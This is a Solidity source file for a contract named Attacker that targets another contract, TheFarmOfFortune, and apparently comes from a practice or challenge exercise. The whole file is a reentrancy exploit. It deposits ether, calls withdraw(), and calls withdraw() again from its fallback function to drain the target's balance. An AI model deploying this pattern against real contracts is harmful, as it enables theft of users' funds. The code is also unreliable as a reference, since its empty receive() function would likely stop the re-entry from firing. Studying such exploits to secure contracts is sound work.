//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TheFarmofFortune.sol";

contract Attacker {
    TheFarmOfFortune target;

     receive() external payable {
    // handle received Ether here
} 
    constructor(address _target) {
        target = TheFarmOfFortune(_target);
    }

    function attack() public payable {
        target.sendTokens{value: msg.value}();
        target.withdraw();
    }

    fallback() external payable {
        if (address(target).balance >= msg.value) {
            target.withdraw();
        }
    }
}